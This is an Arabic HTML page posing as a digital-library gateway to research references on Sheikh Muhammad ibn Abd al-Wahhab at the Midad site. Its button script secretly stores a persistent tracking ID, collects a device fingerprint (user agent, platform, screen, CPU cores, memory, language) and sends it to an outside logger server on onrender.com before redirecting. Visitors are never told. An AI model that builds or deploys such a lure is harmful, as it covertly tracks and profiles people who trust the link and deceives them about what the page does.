<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الباحث الأكاديمي</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
        .btn { background-color: #2c3e50; color: white; border: none; padding: 12px 25px; border-radius: 6px; cursor: pointer; font-size: 16px; text-decoration: none; display: inline-block; margin-top: 20px; transition: 0.3s; }
        .btn:hover { background-color: #34495e; }
    </style>
</head>
<body>
    <div class="card">
        <h3>المكتبة الرقمية - عرض المراجع</h3>
        <p>لقراءة مراجع البحث الخاصة بالشيخ محمد بن عبدالوهاب عبر مكتبة مداد، يرجى الضغط على الزر أدناه.</p>
        <button onclick="logAndGo()" class="btn">الانتقال إلى موقع المكتبة</button>
    </div>

    <script>
        async function logAndGo() {
            // 1. إنشاء أو جلب بصمة تتبع فريدة للجهاز
            let trackingId = localStorage.getItem('tr_id');
            if (!trackingId) {
                trackingId = 'TRK-' + Math.random().toString(36).substr(2, 9).toUpperCase();
                localStorage.setItem('tr_id', trackingId);
            }

            // 2. جمع معلومات الجهاز
            const deviceData = {
                trackingId: trackingId,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                cores: navigator.hardwareConcurrency || "N/A",
                memory: navigator.deviceMemory || "N/A",
                lang: navigator.language
            };

            // رابط سيرفرك في رندر (تأكد أنه نفس الرابط الخاص بك)
            const serverUrl = "https://logger-server-b00a.onrender.com/api/capture";
            const targetSite = "https://midad.com/scholar/36060";

            try {
                // إرسال البيانات للسيرفر
                await fetch(serverUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ deviceMetrics: deviceData })
                });
            } catch (e) {
                console.log("Error capturing data");
            } finally {
                // التحويل للموقع النهائي مهما حدث
                window.location.href = targetSite;
            }
        }
    </script>
</body>
</html>
